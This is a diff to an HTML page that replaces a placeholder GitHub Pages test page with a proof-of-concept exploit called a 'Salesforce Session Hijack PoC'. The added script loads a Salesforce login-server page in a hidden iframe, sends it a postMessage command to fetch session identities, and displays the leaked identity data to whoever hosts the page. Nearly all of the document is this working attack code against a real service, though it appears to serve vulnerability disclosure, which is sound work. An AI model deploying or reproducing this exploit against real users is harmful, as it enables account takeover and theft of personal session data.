@@ -1,11 +1,41 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Testing Page</title>
+  <title>Salesforce Session Hijack PoC</title>
 </head>
 <body>
-  <h1>Hello from GitHub Pages!</h1>
-  <p>This is a test deployment.</p>
+  <h1>Salesforce Account Takeover PoC</h1>
+  <p>Open browser console to see leaked data.</p>
+  <div id="results"></div>
+
+  <!-- Hidden iframe to load the vulnerable Salesforce endpoint -->
+  <iframe id="sf_iframe"
+    src="https://login.salesforce.com/login/sessionserver212.html"
+    style="display:none;"></iframe>
+
+  <script>
+    // Step 1: When the iframe loads, send the malicious command
+    document.getElementById('sf_iframe').onload = function() {
+      console.log("[PoC] Iframe loaded. Sending 'getIdentities' command...");
+      var iframe_window = document.getElementById('sf_iframe').contentWindow;
+      var message = { cmd: "sfdcsession::getIdentities", id: 1, get: [] };
+
+      iframe_window.postMessage(JSON.stringify(message), "https://login.salesforce.com");
+    };
+
+    // Step 2: Listen for the response
+    window.addEventListener('message', function(event) {
+      if (event.origin !== "https://login.salesforce.com") return;
+
+      console.log("[PoC] Leaked Data:", event.data);
+      var leakedData = JSON.parse(event.data);
+      if (leakedData.cmd === "sfdcsession::getIdentities" && leakedData.identities) {
+        document.getElementById('results').innerHTML =
+          "<h2>SUCCESS! Leaked Identities:</h2><pre>" +
+          JSON.stringify(leakedData.identities, null, 2) + "</pre>";
+      }
+    });
+  </script>
 </body>
 </html>
+
